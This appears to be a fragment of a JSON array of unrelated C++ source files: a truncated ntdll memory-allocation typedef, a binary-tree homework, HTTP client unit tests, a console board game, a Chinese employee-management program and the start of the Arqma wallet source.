}\r\n\r\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\r\n    typedef NTSTATUS(NTAPI* pfnNtAllocateVirtualMemory)(\r\n        HANDLE ProcessHandle,\r\n        PVOID* BaseAddress,\r\n        ULONG_PTR ZeroBits,\r\n        PSIZE_T RegionSize,\r\n        ULONG AllocationType,\r\n        ULONG",
    "/*\n Program Name: main.cpp\n Programmer: Moris Gomez\n Date: Tuesday 05/29/2024\n Version Control: 10.0\n About: Week 15, CSCI 2, HW.\n Description:\n 1. Write a member function for the IntBinaryTree \n class that counts and returns the number of nodes\n in the tree. Demonstrate the function in a driver \n program.\n \n 2. Write a member function for the IntBinaryTree \n class that counts and returns the number of leaf\n nodes in the tree. Demonstrate the function in a\n driver program.\n */\n\n#include <iostream>\nusing namespace std;\n\nclass IntBinaryTree\n{\nprivate:\n    struct TreeNode\n    {\n        int data;\n        TreeNode* left;\n        TreeNode* right;\n    };\n    TreeNode* root;\n    int countTotalNodes;\n    int countLeafNodes;\n    \npublic:\n    //default constructor for IntBinaryTree class:\n    IntBinaryTree()\n    {\n        root = NULL;\n        countTotalNodes = 0;\n        countLeafNodes = 0;\n    } //close constructor\n    \n    TreeNode* getRoot()\n    {\n        return root;\n    }\n    \n//function 1: creates a TreeNode.\n    void createNode(int num)\n    {\n        TreeNode* newNode = NULL;\n        newNode = new TreeNode;\n        newNode->data = num;\n        newNode->left = NULL;\n        newNode->right = NULL;\n        insertNode(root, newNode); //passes new TreeNode into function 2.\n    } //close createNode function.\n    \n//function 2: puts new TreeNode in proper place\n    void insertNode(TreeNode*& nodeptr, TreeNode*& newNode) //&???????\n    //(root, newNode)\n    {\n        if(nodeptr == NULL) //base case controlling recursion and located at end of branch, so insertion point found.\n        { //also means root is not set in frist node creation.\n            nodeptr = newNode; //insert data.\n        }\n        else if(newNode->data < nodeptr->data) //data is less than parent data, so go left.\n            //3 < 7\n            //10 < 7\n        {\n            insertNode(nodeptr->left, newNode); //recursion to go left.\n            //nodeptr->left (null) becomes nodeptr in new call.\n            //move to next node after each recursion call.\n        }\n        else //data is greater than parent data, so go right.\n        {\n            //3 > 7\n            //10 > 7\n            insertNode(nodeptr->right, newNode); //recursion to go right.\n            //nodeptr->right (null) becomes nodeptr in new call.\n            //move to next node after each recursion call.\n        }\n    } //close insertNode function.\n    \n//function 3:\n    bool searchNode(int num)\n    {\n        TreeNode* nodeptr = root;\n        while(nodeptr) //nodeptr is pointing to a Node.\n        {\n            if(nodeptr->data == num)\n            {\n                return true;\n            }\n            else if(num < nodeptr->data)\n            {\n                nodeptr = nodeptr->left;\n            }\n            else\n            {\n                nodeptr = nodeptr->right;\n            }\n        } //end while.\n        return false; //?????????????\n    } //close searchNode function.\n    \n//destructor: CANT WE SIMPLIFY DESTRUCTOR AND FUNCTION 4 TO JUST 1 FUNCTION?\n    ~IntBinaryTree()\n    {\n        destroyTree(root);\n    } //close destructor.\n    \n//function 4:\n    void destroyTree(TreeNode* nodeptr)\n    {\n        if(nodeptr)\n        {\n            if(nodeptr->left)\n            {\n                destroyTree(nodeptr->left); //recursion.\n            }\n            if(nodeptr->right)\n            {\n                destroyTree(nodeptr->right);  //recursion.\n            }\n            delete nodeptr;\n        } //end if.\n    } //close destroyTree function.\n    \n//function 5: CANT WE COMBINE 5, 6 AND 7 INTO 1 FUNCTION?\n    void remove(int num)\n    {\n        deleteNode(num, root);\n    } //close remove function.\n    \n//function 6:\n    void deleteNode(int num, TreeNode*& nodeptr)\n    {\n        if(num < nodeptr->data)\n        {\n            deleteNode(num, nodeptr->left); //recursion.\n        }\n        else if(num > nodeptr->data)\n        {\n            deleteNode(num, nodeptr->right); //recursion.\n        }\n        else\n        {\n            makeDeletion(nodeptr);\n        }\n    } //close deleteNode function.\n\n//function 7:\n    void makeDeletion(TreeNode*& nodeptr)\n    {\n        TreeNode* tempNodePtr = NULL;\n        \n        if(nodeptr == NULL)\n        {\n            cout << \"cannot delete empty node.\" << endl;\n        }\n        else if(nodeptr->right == NULL)\n        {\n            tempNodePtr = nodeptr;\n            nodeptr = nodeptr->left; //reattach left child.\n            delete tempNodePtr;\n        }\n        else if(nodeptr->left == NULL)\n        {\n            tempNodePtr = nodeptr;\n            nodeptr = nodeptr->right; //reattach right child.\n            delete tempNodePtr;\n        }\n        else //if Node has 2 children.\n        {\n            //move 1 node on right.\n            tempNodePtr = nodeptr->right;\n            \n            //go to end of left node.\n            while(tempNodePtr->left)\n            {\n                tempNodePtr = tempNodePtr->left;\n            }\n            \n            //reatta",
    "#include <thread>\n#include <chrono>\n\n#include \"catch.hpp\"\n#include \"test_helpers.hpp\"\n#include \"duckdb.hpp\"\n\n#include \"charset_converter.hpp\"\n#include \"erpl_http_client.hpp\"\n#include \"duckdb_argument_helper.hpp\"\n\nusing namespace erpl_web;\nusing namespace std;\n\nTEST_CASE(\"HttpUrl Parsing and Serialization\", \"[http_url]\") {\n    SECTION(\"Parsing valid URLs\") {\n        HttpUrl url(\"https://www.example.com:8080/path?query=value#fragment\");\n        REQUIRE(url.Scheme() == \"https\");\n        REQUIRE(url.Host() == \"www.example.com\");\n        REQUIRE(url.Port() == \"8080\");\n        REQUIRE(url.Path() == \"/path\");\n        REQUIRE(url.Query() == \"?query=value\");\n        REQUIRE(url.Fragment() == \"#fragment\");\n    }\n\n    SECTION(\"Serializing URL components back to string\") {\n        HttpUrl url(\"http://www.example.com/path\");\n        REQUIRE(url.ToSchemeHostAndPort() == \"http://www.example.com\");\n        REQUIRE(url.ToPathQueryFragment() == \"/path\");\n        REQUIRE(url.ToString() == \"http://www.example.com/path\");\n    }\n\n    SECTION(\"Comparison of URLs\") {\n        HttpUrl url1(\"http://example.com\");\n        HttpUrl url2(\"http://example.com/\");\n        REQUIRE_FALSE(url1.Equals(url2));\n    }\n\n    SECTION(\"Setting and getting URL components\") {\n        HttpUrl url(\"http://example.com\");\n        url.Scheme(\"https\");\n        url.Host(\"www.example.com\");\n        url.Port(\"443\");\n        url.Path(\"/newpath\");\n        url.Query(\"?newquery\");\n        url.Fragment(\"#newfragment\");\n        REQUIRE(url.Scheme() == \"https\");\n        REQUIRE(url.Host() == \"www.example.com\");\n        REQUIRE(url.Port() == \"443\");\n        REQUIRE(url.Path() == \"/newpath\");\n        REQUIRE(url.Query() == \"?newquery\");\n        REQUIRE(url.Fragment() == \"#newfragment\");\n        REQUIRE(url.ToSchemeHostAndPort() == \"https://www.example.com:443\");\n        REQUIRE(url.ToPathQueryFragment() == \"/newpath?newquery#newfragment\");\n        REQUIRE(url.ToString() == \"https://www.example.com:443/newpath?newquery#newfragment\");\n    }\n}\n\nTEST_CASE(\"HttpMethod Tests\", \"[http_method]\") {\n    SECTION(\"Convert string to HttpMethod\") {\n        REQUIRE(HttpMethod::FromString(\"GET\") == HttpMethod::GET);\n        REQUIRE(HttpMethod::FromString(\"POST\") == HttpMethod::POST);\n        REQUIRE(HttpMethod::FromString(\"PUT\") == HttpMethod::PUT);\n        REQUIRE(HttpMethod::FromString(\"DELETE\") == HttpMethod::_DELETE);\n        REQUIRE(HttpMethod::FromString(\"PATCH\") == HttpMethod::PATCH);\n        REQUIRE(HttpMethod::FromString(\"HEAD\") == HttpMethod::HEAD);\n        REQUIRE(HttpMethod::FromString(\"OPTIONS\") == HttpMethod::OPTIONS);\n        REQUIRE(HttpMethod::FromString(\"TRACE\") == HttpMethod::TRACE);\n        REQUIRE(HttpMethod::FromString(\"CONNECT\") == HttpMethod::CONNECT);\n    }\n\n    SECTION(\"Convert HttpMethod to string\") {\n        REQUIRE(HttpMethod(HttpMethod::GET).ToString() == \"GET\");\n        REQUIRE(HttpMethod(HttpMethod::POST).ToString() == \"POST\");\n        REQUIRE(HttpMethod(HttpMethod::PUT).ToString() == \"PUT\");\n        REQUIRE(HttpMethod(HttpMethod::_DELETE).ToString() == \"DELETE\");\n        REQUIRE(HttpMethod(HttpMethod::PATCH).ToString() == \"PATCH\");\n        REQUIRE(HttpMethod(HttpMethod::HEAD).ToString() == \"HEAD\");\n        REQUIRE(HttpMethod(HttpMethod::OPTIONS).ToString() == \"OPTIONS\");\n        REQUIRE(HttpMethod(HttpMethod::TRACE).ToString() == \"TRACE\");\n        REQUIRE(HttpMethod(HttpMethod::CONNECT).ToString() == \"CONNECT\");\n    }\n\n    SECTION(\"Convert invalid string to HttpMethod\") {\n        REQUIRE_THROWS_AS(HttpMethod::FromString(\"INVALID\"), std::runtime_error);\n    }\n}\n\nTEST_CASE(\"Test http HEAD\", \"[http_client]\")\n{\n    HttpClient client;\n\n    auto response = client.Head(\"https://google.com\");\n    REQUIRE(response->code == 200);\n}\n\nTEST_CASE(\"Test http GET\", \"[http_client]\")\n{\n    HttpClient client;\n\n    auto response = client.Get(\"http://httpbun.com/get\");\n    REQUIRE(response->code == 200);\n    REQUIRE(response->content_type == \"application/json\");\n\n    response = client.Get(\"https://httpbun.com/get\");\n    REQUIRE(response->code == 200);\n    REQUIRE(response->content_type == \"application/json\");\n\n    auto val = response->ToValue();\n    auto content = ValueHelper(val)[\"content\"];\n    auto content_json = content.DefaultCastAs(duckdb::LogicalType::JSON());\n}\n\nTEST_CASE(\"Test http GET on google.com\", \"[http_client]\")\n{\n\tHttpClient client;\n\n\tauto response = client.Get(\"https://google.com\");\n\tREQUIRE(response->code == 200);\n\tREQUIRE(response->content_type == \"text/html; charset=ISO-8859-1\");\n\n\tauto conv = CharsetConverter(response->content_type);\n\tauto val = conv.convert(response->content);\n\n\t// Check if val starts with <!doctype html>\n\tREQUIRE(val.find(\"<!doctype html>\") == 0);\n}\n\nTEST_CASE(\"Test http GET on erpl.io\", \"[http_client]\")\n{\n\tHttpClient client;\n\n\tauto response = client.Get(\"https://erpl.io\");\n\tREQUIRE(response->code == 200);\n\tREQUIRE(response->content_type == \"text/html; charset=utf-8\");\n}\n",
    "#include <iostream>\n#include <ctime>\n#include <cstdlib>\n#include <limits>\n\nchar box[8][4]{};\nchar temp_box1[8][4]{};\nchar temp_box2[8][4]{};\n\nconst unsigned short int max_length{20};\nchar player_name[max_length]{\"JOHN\"};\n\nunsigned short int play_mode{3};\nunsigned short int choice[2]{};\nunsigned short int y[4];\nunsigned short int x[4];\nbool moved_by_knock{false};\nunsigned short int temp_y[20]{};\nunsigned short int temp_x[20]{};\nunsigned short int y1_store[20]{};\nunsigned short int x1_store[20]{};\n\nvoid reset_board();\nvoid print_board();\n\nvoid player();\nbool choice_processing(int index);\nbool select_piece_player();\nbool move_piece_player();\nbool more_knocks();\n\nvoid computer();\nbool knocks_checking(int *total_knocks);\nunsigned short int total_moves_comp();\nunsigned short int total_unknock_moves();\nvoid select_piece_comp();\nvoid move_piece_comp(char knock);\nbool future_knock_byPlayer(char);\nint future_maxKnocks_comp();\nbool future_more_knocks();\nint future_maxKnocks_player();\nbool remove_players_knock();\nbool block_players_knock();\nbool remove_or_block_knock();\n\nint main()\n{\n    srand(time(0));\n    /*\n    bool end{true};\n    bool winner{false};\n\n    std::cout << '\\n';\n    std::cout << \"        Enter your name dear: \";\n\n    char temp_name[max_length]{};\n    std::cin.getline(temp_name, max_length);\n\n    for (short int i{}; i < std::size(temp_name); ++i)\n    {\n        if (temp_name[i] == ' ')\n        {\n            break;\n        }\n        temp_name[i] = std::toupper(temp_name[i]);\n        player_name[i] = temp_name[i];\n    }\n\n    std::cout << std::endl;\n    std::cout << \"                       ID  |  MODE\" << std::endl;\n    std::cout << \"                    -------|--------------\" << std::endl;\n    std::cout << \"                        1  |  Easy\" << std::endl;\n    std::cout << \"                        2  |  Intermediate\" << std::endl;\n    std::cout << \"                        3  |  Normal\" << std::endl;\n    std::cout << \"                    -------|--------------\" << std::endl;\n    std::cout << std::endl;\n\n    while (play_mode != 1 && play_mode != 2 && play_mode != 3)\n    {\n        std::cout << \"                    Enter mode ID: \";\n        if (!(std::cin >> play_mode))\n        {\n            std::cout << \"                Invalid input! Try again!\" << std::endl;\n            std::cin.clear();\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n        }\n    }\n\n    std::cout << '\\n';*/\n    reset_board();\n\n    for (short int i = 0; i < 40; i++)\n    {\n        computer();\n        // player();\n    }\n\n    std::cout << \"\\n        PROGRAM ENDS WELL\" << std::endl;\n    return 0;\n}\n\nvoid reset_board()\n{\n    for (short int row{}; row < 8; row++)\n    {\n        for (short int column{}; column < 4; column++)\n        {\n            box[row][column] = ' ';\n            temp_box1[row][column] = ' ';\n            temp_box2[row][column] = ' ';\n        }\n    }\n\n    // player\n    for (short int row{}; row < 3; row++)\n    {\n        for (short int column{}; column < 4; column++)\n        {\n            box[row][column] = ' ';\n        }\n    }\n\n    // comp\n    for (short int row{5}; row <= 7; row++)\n    {\n        for (short int column{}; column < 4; column++)\n        {\n            box[row][column] = 'o';\n        }\n    }\n}\n\nvoid print_board()\n{\n    std::cout << '\\n';\n    std::cout << \"              1   2   3   4   5   6   7   8  \" << std::endl;\n    std::cout << '\\n';\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        8   | \" << box[7][0] << \" |   | \" << box[7][1] << \" |   | \" << box[7][2] << \" |   | \" << box[7][3] << \" |   |   8\" << std::endl;\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        7   |   | \" << box[6][0] << \" |   | \" << box[6][1] << \" |   | \" << box[6][2] << \" |   | \" << box[6][3] << \" |   7\" << std::endl;\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        6   | \" << box[5][0] << \" |   | \" << box[5][1] << \" |   | \" << box[5][2] << \" |   | \" << box[5][3] << \" |   |   6\" << std::endl;\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        5   |   | \" << box[4][0] << \" |   | \" << box[4][1] << \" |   | \" << box[4][2] << \" |   | \" << box[4][3] << \" |   5\" << std::endl;\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        4   | \" << box[3][0] << \" |   | \" << box[3][1] << \" |   | \" << box[3][2] << \" |   | \" << box[3][3] << \" |   |   4\" << std::endl;\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        3   |   | \" << box[2][0] << \" |   | \" << box[2][1] << \" |   | \" << box[2][2] << \" |   | \" << box[2][3] << \" |   3\" << std::endl;\n    std::cout << \"            |---|---|---|---|---|---|---|---|\" << std::endl;\n    std::cout << \"        2   | \" << box[1][0] << \" |   | \" << box[1][1] << \" |   | \" << box[1][2]",
    "#include \"workerManager.h\"\r\n\r\n//\u6784\u9020\u51fd\u6570\u5b9e\u73b0\r\nWorkerManager::WorkerManager()\r\n{\r\n\t//\u521d\u59cb\u5316\u4eba\u6570\r\n\tthis->m_EmpNum = 0;\r\n\r\n\t//\u521d\u59cb\u5316\u6570\u7ec4\u6307\u9488\r\n\tthis->m_EmpArray = NULL;\r\n\r\n\tifstream ifs;\r\n\tifs.open(FILENAME, ios::in);\r\n\r\n\t//\u6587\u4ef6\u4e0d\u5b58\u5728\u60c5\u51b5\r\n\tif (!ifs.is_open())\r\n\t{\r\n\t\tcout << \"\u6587\u4ef6\u4e0d\u5b58\u5728\" << endl; //\u6d4b\u8bd5\u8f93\u51fa\r\n\t\tthis->m_EmpNum = 0;  //\u521d\u59cb\u5316\u4eba\u6570\r\n\t\tthis->m_FileIsEmpty = true; //\u521d\u59cb\u5316\u6587\u4ef6\u4e3a\u7a7a\u6807\u5fd7\r\n\t\tthis->m_EmpArray = NULL; //\u521d\u59cb\u5316\u6570\u7ec4\r\n\t\tifs.close(); //\u5173\u95ed\u6587\u4ef6\r\n\r\n\t\treturn;\r\n\t}\r\n\r\n\t//\u6587\u4ef6\u5b58\u5728\uff0c\u5e76\u4e14\u6ca1\u6709\u8bb0\u5f55\r\n\tchar ch;\r\n\tifs >> ch; //\u5148\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\uff0c\u5047\u5982\u8bfb\u5b8c\u8fd9\u4e2a\u5b57\u7b26\uff0c\u6587\u4ef6\u5c31\u5230\u4e86\u6587\u4ef6\u5c3e\uff0c\u4e5f\u5c31\u662fifs.EOF()\u4e3atrue\uff0c\uff08end of file\uff09\uff0c\u5c31\u8bf4\u660e\u6587\u4ef6\u662f\u7a7a\u7684\r\n\tif (ifs.eof())\r\n\t{\r\n\t\tcout << \"\u6587\u4ef6\u4e3a\u7a7a!\" << endl;\r\n\t\tthis->m_EmpNum = 0;\r\n\t\tthis->m_FileIsEmpty = true;\r\n\t\tthis->m_EmpArray = NULL;\r\n\t\tifs.close();\r\n\t\treturn;\r\n\t}\r\n\tint num = this->get_EmpNum();\r\n\tcout << \"\u804c\u5de5\u4e2a\u6570\u4e3a\uff1a\" << num << endl;  //\u6d4b\u8bd5\u4ee3\u7801\r\n\tthis->m_EmpNum = num;  //\u66f4\u65b0\u6210\u5458\u5c5e\u6027 \r\n\r\n\t//\u6839\u636e\u804c\u5de5\u6570\u521b\u5efa\u6570\u7ec4\r\n\tthis->m_EmpArray = new Worker * [this->m_EmpNum];\r\n\t//\u521d\u59cb\u5316\u804c\u5de5\r\n\tinit_Emp();\r\n}\r\n\r\n//\u663e\u793a\u83dc\u5355\r\nvoid WorkerManager::Show_Menu()\r\n{\r\n\tcout << \"********************************************\" << endl;\r\n\tcout << \"*********  \u6b22\u8fce\u4f7f\u7528\u804c\u5de5\u7ba1\u7406\u7cfb\u7edf\uff01 **********\" << endl;\r\n\tcout << \"*************  0.\u9000\u51fa\u7ba1\u7406\u7a0b\u5e8f  *************\" << endl;\r\n\tcout << \"*************  1.\u589e\u52a0\u804c\u5de5\u4fe1\u606f  *************\" << endl;\r\n\tcout << \"*************  2.\u663e\u793a\u804c\u5de5\u4fe1\u606f  *************\" << endl;\r\n\tcout << \"*************  3.\u5220\u9664\u79bb\u804c\u804c\u5de5  *************\" << endl;\r\n\tcout << \"*************  4.\u4fee\u6539\u804c\u5de5\u4fe1\u606f  *************\" << endl;\r\n\tcout << \"*************  5.\u67e5\u627e\u804c\u5de5\u4fe1\u606f  *************\" << endl;\r\n\tcout << \"*************  6.\u6309\u7167\u7f16\u53f7\u6392\u5e8f  *************\" << endl;\r\n\tcout << \"*************  7.\u6e05\u7a7a\u6240\u6709\u6587\u6863  *************\" << endl;\r\n\tcout << \"********************************************\" << endl;\r\n\tcout << endl;\r\n}\r\n\r\n//\u9000\u51fa\u51fd\u6570\r\nvoid WorkerManager::exitSystem()\r\n{\r\n\tcout << \"\u6b22\u8fce\u4e0b\u6b21\u4f7f\u7528\" << endl;\r\n\tsystem(\"pause\");\r\n\texit(0); //\u4e0d\u7ba1\u5728\u4ec0\u4e48\u5730\u65b9\u8fd0\u884c\u8fd9\u4e2a\u8bed\u53e5\uff0c\u90fd\u53ef\u4ee5\u5b9e\u73b0\u9000\u51fa\u7a0b\u5e8f\r\n}\r\n\r\n//\u589e\u52a0\u804c\u5de5\r\nvoid WorkerManager::Add_Emp()\r\n{\r\n\t//\u66f4\u65b0\u804c\u5de5\u4e0d\u4e3a\u7a7a\u6807\u5fd7\r\n\tthis->m_FileIsEmpty = false;\r\n\r\n\tcout << \"\u8bf7\u8f93\u5165\u589e\u52a0\u804c\u5de5\u6570\u91cf\uff1a \" << endl;\r\n\r\n\tint addNum = 0;\r\n\tcin >> addNum;\r\n\r\n\tif (addNum > 0)\r\n\t{\r\n\t\t//\u8ba1\u7b97\u65b0\u7a7a\u95f4\u5927\u5c0f\r\n\t\tint newSize = this->m_EmpNum + addNum;\r\n\r\n\t\t//\u5f00\u8f9f\u65b0\u7a7a\u95f4\r\n\t\tWorker** newSpace = new Worker * [newSize];\r\n\r\n\t\t//\u5c06\u539f\u7a7a\u95f4\u4e0b\u5185\u5bb9\u5b58\u653e\u5230\u65b0\u7a7a\u95f4\u4e0b\r\n\t\tif (this->m_EmpArray != NULL)\r\n\t\t{\r\n\t\t\tfor (int i = 0; i < this->m_EmpNum; i++)\r\n\t\t\t{\r\n\t\t\t\tnewSpace[i] = this->m_EmpArray[i];\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t//\u8f93\u5165\u65b0\u6570\u636e\r\n\t\tfor (int i = 0; i < addNum; i++)\r\n\t\t{\r\n\t\t\tint id;\r\n\t\t\tstring name;\r\n\t\t\tint dSelect;\r\n\r\n\t\t\tcout << \"\u8bf7\u8f93\u5165\u7b2c \" << i + 1 << \" \u4e2a\u65b0\u804c\u5de5\u7f16\u53f7\uff1a\" << endl;\r\n\t\t\tcin >> id;\r\n\r\n\r\n\t\t\tcout << \"\u8bf7\u8f93\u5165\u7b2c \" << i + 1 << \" \u4e2a\u65b0\u804c\u5de5\u59d3\u540d\uff1a\" << endl;\r\n\t\t\tcin >> name;\r\n\r\n\r\n\t\t\tcout << \"\u8bf7\u9009\u62e9\u8be5\u804c\u5de5\u7684\u5c97\u4f4d\uff1a\" << endl;\r\n\t\t\tcout << \"1\u3001\u666e\u901a\u804c\u5de5\" << endl;\r\n\t\t\tcout << \"2\u3001\u7ecf\u7406\" << endl;\r\n\t\t\tcout << \"3\u3001\u8001\u677f\" << endl;\r\n\t\t\tcin >> dSelect;\r\n\r\n\r\n\t\t\tWorker* worker = NULL;\r\n\t\t\tswitch (dSelect)\r\n\t\t\t{\r\n\t\t\tcase 1: //\u666e\u901a\u5458\u5de5\r\n\t\t\t\tworker = new Employee(id, name, 1);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2: //\u7ecf\u7406\r\n\t\t\t\tworker = new Manager(id, name, 2);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:  //\u8001\u677f\r\n\t\t\t\tworker = new Boss(id, name, 3);\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\r\n\t\t\tnewSpace[this->m_EmpNum + i] = worker;\r\n\t\t}\r\n\r\n\t\t//\u91ca\u653e\u539f\u6709\u7a7a\u95f4\r\n\t\tdelete[] this->m_EmpArray;\r\n\r\n\t\t//\u66f4\u6539\u65b0\u7a7a\u95f4\u7684\u6307\u5411\r\n\t\tthis->m_EmpArray = newSpace;\r\n\r\n\t\t//\u66f4\u65b0\u65b0\u7684\u4e2a\u6570\r\n\t\tthis->m_EmpNum = newSize;\r\n\r\n\t\t//\u63d0\u793a\u4fe1\u606f\r\n\t\tcout << \"\u6210\u529f\u6dfb\u52a0\" << addNum << \"\u540d\u65b0\u804c\u5de5\uff01\" << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"\u8f93\u5165\u6709\u8bef\" << endl;\r\n\t}\r\n\r\n\tsystem(\"pause\");\r\n\tsystem(\"cls\");\r\n}\r\n\r\n//\u4fdd\u5b58\u6587\u4ef6\r\nvoid WorkerManager::save()\r\n{\r\n\tofstream ofs;\r\n\tofs.open(FILENAME, ios::out);\r\n\r\n\r\n\tfor (int i = 0; i < this->m_EmpNum; i++)\r\n\t{\r\n\t\tofs << this->m_EmpArray[i]->m_Id << \" \"\r\n\t\t\t<< this->m_EmpArray[i]->m_Name << \" \"\r\n\t\t\t<< this->m_EmpArray[i]->m_DeptId << endl;\r\n\t}\r\n\r\n\tofs.close();\r\n}\r\n\r\n//\u7edf\u8ba1\u4eba\u6570\r\nint WorkerManager::get_EmpNum()\r\n{\r\n\tifstream ifs;\r\n\tifs.open(FILENAME, ios::in);\r\n\r\n\tint id;\r\n\tstring name;\r\n\tint dId;\r\n\r\n\tint num = 0;\r\n\r\n\twhile (ifs >> id && ifs >> name && ifs >> dId)\r\n\t{\r\n\t\t//\u8bb0\u5f55\u4eba\u6570\r\n\t\tnum++;\r\n\t}\r\n\tifs.close();\r\n\r\n\treturn num;\r\n}\r\n\r\nvoid WorkerManager::init_Emp()\r\n{\r\n\tifstream ifs;\r\n\tifs.open(FILENAME, ios::in);\r\n\r\n\tint id;\r\n\tstring name;\r\n\tint dId;\r\n\r\n\tint index = 0;\r\n\twhile (ifs >> id && ifs >> name && ifs >> dId) //\u6bcf\u4e00\u6b21>>\u90fd\u53ef\u4ee5\u8bfb\u53d6\u4e00\u6bb5\u4ee5\u7a7a\u683c\u6216\u56de\u8f66\u952e\uff08\u5373\u767d\u8272\u5b57\u7b26\uff09\u5206\u5f00\u7684\u5143\u7d20\u3002\u4e00\u884c\u6709\u4e09\u6761\u4fe1\u606f\uff0c\u56e0\u6b64while\u4e2d\u7684\u8bed\u53e5\u76f8\u5f53\u4e8e\u6bcf\u6b21\u8bfb\u53d6\u4e00\u884c\u5143\u7d20\uff0c\u5e76\u4ee5\u53d8\u91cf\u63a5\u6536\r\n\t{\r\n\t\tWorker* worker = NULL;\r\n\t\t//\u6839\u636e\u4e0d\u540c\u7684\u90e8\u95e8Id\u521b\u5efa\u4e0d\u540c\u5bf9\u8c61\r\n\t\tif (dId == 1)  // 1\u666e\u901a\u5458\u5de5\r\n\t\t{\r\n\t\t\tworker = new Employee(id, name, dId);\r\n\t\t}\r\n\t\telse if (dId == 2) //2\u7ecf\u7406\r\n\t\t{\r\n\t\t\tworker = new Manager(id, name, dId);\r\n\t\t}\r\n\t\telse //\u603b\u88c1\r\n\t\t{\r\n\t\t\tworker = new Boss(id, name, dId);\r\n\t\t}\r\n\t\t//\u5b58\u653e\u5728\u6570\u7ec4\u4e2d\r\n\t\tthis->m_EmpArray[index] = worker;\r\n\t\tindex++;\r\n\t}\r\n}\r\n\r\n//\u663e\u793a\u804c\u5de5\r\nvoid WorkerManager::Show_Emp()\r\n{\r\n\tif (this->m_FileIsEmpty)\r\n\t{\r\n\t\tcout << \"\u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u8bb0\u5f55\u4e3a\u7a7a\uff01\" << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tfor (int i = 0; i < m_EmpNum; i++)\r\n\t\t{\r\n\t\t\t//\u5229\u7528\u591a\u6001\u8c03\u7528\u63a5\u53e3\r\n\t\t\tthis->m_EmpArray[i]->showInfo();\r\n\t\t}\r\n\t}\r\n\r\n\tsystem(\"pause\");\r\n\tsystem(\"cls\");\r\n}\r\n\r\nint WorkerManager::IsExist(int id)\r\n{\r\n\tint index = -1;\r\n\r\n\tfor (int i = 0; i < this->m_EmpNum; i++)\r\n\t{\r\n\t\tif (this->m_EmpArray[i]->m_Id == id)\r\n\t\t{\r\n\t\t\tindex = i;\r\n\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\treturn index;\r\n}\r\n\r\n//\u5220\u9664\u804c\u5de5\r\nvoid WorkerManager::Del_Emp()\r\n{\r\n\tif (this->m_FileIsEmpty)\r\n\t{\r\n\t\tcout << \"\u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u8bb0\u5f55\u4e3a\u7a7a\uff01\" << endl;\r\n\t}\r\n\tels",
    "// Copyright (c) 2018-2019, The Arqma Network\n// Copyright (c) 2014-2018, The Monero Project\n//\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without modification, are\n// permitted provided that the following conditions are met:\n//\n// 1. Redistributions of source code must retain the above copyright notice, this list of\n//    conditions and the following disclaimer.\n//\n// 2. Redistributions in binary form must reproduce the above copyright notice, this list\n//    of conditions and the following disclaimer in the documentation and/or other\n//    materials provided with the distribution.\n//\n// 3. Neither the name of the copyright holder nor the names of its contributors may be\n//    used to endorse or promote products derived from this software without specific\n//    prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\n// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL\n// THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\n// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF\n// THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n//\n// Parts of this file are originally copyright (c) 2012-2013 The Cryptonote developers\n\n#include <numeric>\n#include <tuple>\n#include <boost/format.hpp>\n#include <boost/optional/optional.hpp>\n#include <boost/utility/value_init.hpp>\n#include <boost/algorithm/string/classification.hpp>\n#include <boost/algorithm/string/trim.hpp>\n#include <boost/algorithm/string/split.hpp>\n#include <boost/algorithm/string/join.hpp>\n#include <boost/asio/ip/address.hpp>\n#include <boost/range/adaptor/transformed.hpp>\n#include <boost/preprocessor/stringize.hpp>\n#include \"include_base_utils.h\"\nusing namespace epee;\n\n#include \"cryptonote_config.h\"\n#include \"wallet_rpc_helpers.h\"\n#include \"wallet2.h\"\n#include \"cryptonote_basic/cryptonote_format_utils.h\"\n#include \"rpc/core_rpc_server_commands_defs.h\"\n#include \"rpc/core_rpc_server_error_codes.h\"\n#include \"rpc_sig/rpc_payment_signature.h\"\n#include \"rpc/rpc_payment_costs.h\"\n#include \"misc_language.h\"\n#include \"cryptonote_basic/cryptonote_basic_impl.h\"\n#include \"multisig/multisig.h\"\n#include \"common/boost_serialization_helper.h\"\n#include \"common/command_line.h\"\n#include \"common/threadpool.h\"\n#include \"int-util.h\"\n#include \"profile_tools.h\"\n#include 